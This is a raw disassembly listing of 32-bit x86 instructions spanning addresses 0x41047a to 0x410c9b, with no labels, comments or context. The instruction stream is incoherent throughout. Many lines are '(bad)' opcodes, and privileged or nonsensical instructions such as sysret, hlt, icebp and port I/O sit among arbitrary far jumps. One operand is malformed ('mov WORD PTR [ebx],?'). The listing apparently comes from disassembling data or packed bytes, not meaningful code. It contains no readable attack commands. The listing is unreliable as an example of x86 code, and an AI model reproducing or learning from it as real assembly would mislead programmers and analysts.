  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
